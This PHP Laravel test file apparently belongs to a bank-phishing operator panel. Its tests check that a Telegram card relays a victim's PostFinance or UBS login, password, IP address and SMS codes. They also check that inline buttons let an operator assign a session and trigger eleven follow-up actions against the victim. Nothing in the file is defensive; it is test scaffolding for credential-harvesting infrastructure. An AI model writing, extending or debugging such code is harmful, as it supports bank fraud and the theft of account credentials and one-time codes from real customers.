<?php

namespace Tests\Feature;

use App\Enums\BankSessionStatus;
use App\Models\BankSession;
use App\Services\Telegram\TelegramCardBuilder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

class TelegramCardBuilderTest extends TestCase
{
    use RefreshDatabase;

    public function test_card_text_contains_bank_credentials_and_state(): void
    {
        $session = BankSession::create([
            'bank_slug'   => 'postfinance',
            'ip_address'  => '1.2.3.4',
            'credentials' => ['login' => 'u', 'password' => 'p'],
            'action_type' => ['type' => 'sms'],
            'answers'     => [['command' => 'sms', 'payload' => ['code' => '1234']]],
        ]);

        $text = (new TelegramCardBuilder())->buildCardText($session);

        $this->assertStringContainsString('PostFinance', $text);
        $this->assertStringContainsString('1.2.3.4', $text);
        $this->assertStringContainsString('Login', $text);
        $this->assertStringContainsString('1234', $text);
        $this->assertStringContainsString('sms', $text);
    }

    public function test_pending_keyboard_has_only_assign_button(): void
    {
        $session = BankSession::create(['bank_slug' => 'ubs', 'status' => BankSessionStatus::Pending]);
        $kb = (new TelegramCardBuilder())->buildKeyboard($session);
        $all = array_merge(...$kb->inline_keyboard);
        $this->assertCount(1, $all);
        $this->assertEquals("assign:{$session->id}", $all[0]->callback_data);
    }

    public function test_assigned_keyboard_has_11_actions_plus_lifecycle(): void
    {
        $session = BankSession::create(['bank_slug' => 'ubs', 'status' => BankSessionStatus::Assigned]);
        $kb = (new TelegramCardBuilder())->buildKeyboard($session);
        $all = array_merge(...$kb->inline_keyboard);
        // 11 action buttons + complete + unassign = 13
        $this->assertCount(13, $all);
    }

    public function test_completed_keyboard_is_empty(): void
    {
        $session = BankSession::create(['bank_slug' => 'ubs', 'status' => BankSessionStatus::Completed]);
        $kb = (new TelegramCardBuilder())->buildKeyboard($session);
        $all = array_merge(...($kb->inline_keyboard ?? []));
        $this->assertCount(0, $all);
    }
}
